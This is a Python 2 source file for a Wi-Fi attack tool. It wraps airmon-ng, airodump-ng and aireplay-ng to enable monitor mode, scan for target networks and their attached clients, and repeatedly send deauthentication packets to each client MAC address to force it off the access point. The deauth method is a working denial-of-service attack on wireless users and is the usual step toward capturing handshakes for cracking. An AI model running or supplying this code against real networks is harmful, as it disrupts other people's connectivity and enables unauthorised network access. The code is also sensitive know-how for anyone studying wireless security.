#!/usr/bin/python

import time
import os
import signal
from subprocess import Popen, call
from multiprocessing import Process, Pipe
from termcolor import colored #requires: pip install termcolor

class scanner(object):
#Dev null variable for subprocesses 
	DN = open(os.devnull, 'w')

	def __init__(self, iface):
		self.iface = iface

#Set channel to avoid the wrong channel error....
	def set_channel(self, channel):
		self.cmd = ['airmon-ng']
		self.cmd.extend (['stop',			#only report attached clients
			str(self.iface)],)					
		print colored("Airmon-ng command:", 'magenta', 'on_cyan')
		print colored(self.cmd, 'magenta', 'on_cyan')
		call(self.cmd)
		time.sleep(2)
		call('ifconfig wlan1 down')
		print "WAITING READING ETC"
		time.sleep(5)
		self.cmd = ['airmon-ng']
		self.cmd.extend (['start',			#only report attached clients
			str(self.iface)])					
		if channel != 0:
			self.cmd.append(str(channel))
		self.cmd.append('check kill')	
		print colored("Airmon-ng command:", 'magenta', 'on_cyan')
		print colored(self.cmd, 'magenta', 'on_cyan')	
		print colored(self.cmd, 'magenta', 'on_cyan')
		call(self.cmd)
		print "WAITING READING ETC....."
		time.sleep(5)
		
#scan looking for likely networks
#when suitable target networks detected - stop scan
	def scan(self, out_format='', out_dest='', interval=10, channel=0, essid=0, bssid=0, conn=0):
		#print "Creating command line for scanning process"			#debug
		self.cmd = ['airodump-ng']
		self.cmd.extend (['-a',			#only report attached clients
			'--output-format',			#output format
			out_format,				#xml type
			'--write-interval',			#write to file interval
			str(interval)])				#10 seconds	
		if essid == 0:
			self.cmd.append('-w')						#write file dest
			self.cmd.append(out_dest+'scan')						#file dest/name
		if channel != 0:
			self.cmd.append('-c')
			self.cmd.append(str(channel))
		if essid != 0:  
			self.cmd.append('--essid')
			self.cmd.append(str(essid))
			self.cmd.append('-w')
			self.cmd.append(out_dest+str(essid)+'_scan')
		if bssid != 0:
			self.cmd.append('--bssid')
			self.cmd.append(str(bssid))
		self.cmd.append(self.iface)
		#print colored("Starting scanning process airodump-ng", 'red')				#debug
		#print colored("Using command:", 'red'), colored(self.cmd, 'red') 					#debug
		self.proc = Popen(self.cmd, stdout=self.DN, stderr=self.DN)
		try:
			while True:
				time.sleep(1)
				scanning = conn.recv() 			#control from main
				#print "airodump child scanning:", scanning			#debug
				if scanning == False:
					#print colored("Attempting to kill process scan airodump-ng", 'red')	#debug
					conn.close()
					self.send_interrupt()	
					break	
				if scanning == "restart":     #experimental
					#print colored("DEBUG: restart received", 'red')
					self.send_interrupt()     #experimental
					#time.sleep(1)            #experimental
					#print colored("Starting scanning process airodump-ng", 'red')				#debug
					#print colored("Using command:", 'red'), colored(self.cmd, 'red') 					#debug
					self.proc = Popen(self.cmd, stdout=self.DN, stderr=self.DN)    #experimental

		except KeyboardInterrupt:
			pass						

	def deauth(self, essid='', bssid='', client_MAC=[], conn=0):
		#print "Starting process aireplay-ng" 				#debug
		self.client_MAC_list = client_MAC
		scanning = conn.recv() 
		deauth = False
		try:
			while scanning == True:
				for MAC in self.client_MAC_list:
					if scanning == True:
						cmd = ['aireplay-ng']
						cmd.append('-a')		#bssid of AP
						cmd.append(bssid)
						cmd.append('--deauth')	#number of deauth packets to send in one injection round
						cmd.append('5')
						cmd.append('-c')		#client target MAC address, better results than broadcast
						cmd.append(MAC)
						cmd.append(self.iface)
						#print "Using command:", cmd  		#debug
						self.proc = Popen(cmd)
						self.proc.wait()		#wait for deauth subprocess to finish...
						deauth = True
					conn.send(deauth)	
					scanning = conn.recv()    
					if scanning == False:
						conn.close()
						#print "Attempting to kill process deauth"	#debug
						self.send_interrupt()
						break
		except KeyboardInterrupt:
			pass				
					
# Sends interrupt signal to process
	def send_interrupt(self):
		print colored("attempting to kill process:", 'red'), colored(self.proc.pid, 'red')		#debug
		try:
			self.proc.terminate()
		except EnvironmentError:
			pass # ignore 
		except OSError:
			print "os error"
			pass  # process cannot be killed
		except TypeError:
			print "type error"
			pass  # pid is incorrect type
		except UnboundLocalError:
			print "unbound error"
			pass  # 'process' is not defined
		except AttributeError:
			print "attribute error"
			pass  # Trying to kill "None"
